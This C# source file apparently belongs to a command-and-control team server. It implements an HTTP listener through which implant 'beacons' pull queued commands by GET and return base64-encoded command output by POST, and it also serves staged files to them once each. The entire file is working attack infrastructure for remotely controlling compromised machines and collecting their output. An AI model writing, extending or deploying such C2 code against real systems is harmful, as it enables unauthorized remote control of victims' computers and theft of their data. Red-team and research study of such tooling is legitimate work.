using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using static TeamServer.BeaconOperations;


namespace TeamServer.Listeners
{
    class CustomHttpListener : IListener
    {
        public List<Beacon> Beacons { get; set; }

        private HttpListener listener = null;
        private Func<Task> listenerHandler = null;
        private Task listenerTask = null;
        private bool listening = false;

        public static bool httpExists = false;
        public static List<BeaconOperations.HostedFile> hostedFiles = new List<BeaconOperations.HostedFile>();

        public string Ip { get; set; }
        public int Port { get; set; }


        private List<string> ignoreUri = new List<string>
        {
            "favicon.ico"
        };

        public CustomHttpListener(string ip = "localhost", int port = 8081)
        {
            this.Ip = ip;
            this.Port = port;

            listener = new HttpListener();

            listener.Prefixes.Add("http://"+ip+":"+port.ToString()+"/");

            httpExists = true;
        }

        public bool StartListener()
        {
            Console.WriteLine("Starting HTTP Listener on " + listener.Prefixes.First());

            if (listener != null)
            {
                listener.Start();
                listening = true;
                listenerHandler = async () =>
                {
                    while (listening)
                    {
                        HttpListenerContext context = listener.GetContext();
                        HttpListenerRequest req = context.Request;

                        string data;
                        byte[] buffer;
                        Stream ros;

                        List<string> uriSegments = new List<string>(req.Url.Segments);

                        using HttpListenerResponse resp = context.Response;

                        if (uriSegments.Count == 2)
                        {
                            // get the beacon ID
                            string id = uriSegments.Last();

                            HostedFile hostedFile = null;
                            for (int i = 0; i < CustomHttpListener.hostedFiles.Count; i++)
                            {
                                if (CustomHttpListener.hostedFiles[i].fileName == id)
                                {
                                    hostedFile = CustomHttpListener.hostedFiles[i];
                                }
                            }

                            if (hostedFile!=null)
                            {
                                resp.Headers.Set("Content-Type", "text/plain");

                                buffer = hostedFile.content;

                                ros = resp.OutputStream;
                                ros.Write(buffer, 0, buffer.Length);
                                ros.Close();

                                CustomHttpListener.hostedFiles.Remove(hostedFile);
                            }
                            else if (!ignoreUri.Contains(id))
                            {
                                if (req.HttpMethod == "GET") // GET - beacon gets next instructions
                                {
                                    List<string> commands = ((IListener)this).GetBeaconCommands(id);
                                    string jsonCommands = JsonSerializer.Serialize<List<string>>(commands);

                                    resp.Headers.Set("Content-Type", "application/json");

                                    data = jsonCommands;
                                    buffer = Encoding.UTF8.GetBytes(data);
                                    resp.ContentLength64 = buffer.Length;

                                    ros = resp.OutputStream;
                                    ros.Write(buffer, 0, buffer.Length);
                                    ros.Close();
                                }
                                else if(req.HttpMethod == "POST") // POST - beacon sends output back
                                {
                                    // we will assume a JSON structure: {"output": "STDOUT output from beacon"}
                                    string body = new StreamReader(context.Request.InputStream).ReadToEnd();
                                    byte[] decodedBody = Convert.FromBase64String(body);
                                    string decodedString = System.Text.Encoding.UTF8.GetString(decodedBody);

                                    ((IListener)this).AddBeaconOutput(id, decodedString);

                                    byte[] b = Encoding.UTF8.GetBytes("ACK");
                                    context.Response.StatusCode = 200;
                                    context.Response.KeepAlive = false;
                                    context.Response.ContentLength64 = b.Length;

                                    // output from the server
                                    var output = context.Response.OutputStream;
                                    output.Write(b, 0, b.Length);
                                    context.Response.Close();
                                }
                            }
                            continue;
                        }

                        data = "Listening...";
                        buffer = Encoding.UTF8.GetBytes(data);
                        resp.ContentLength64 = buffer.Length;

                        ros = resp.OutputStream;
                        ros.Write(buffer, 0, buffer.Length);
                        ros.Close();
                    }
                };

                listenerTask = Task.Run(listenerHandler);

                return true;
            }
            else
            {
                throw new ArgumentException();
            }
            return false;
        }

        public void StopListener()
        {
            if (listener.IsListening)
            {
                listening = false;

                listener.Stop();
                listener = null;
                listenerTask.Dispose();
                listenerTask = null;
            }
        }
    }
}
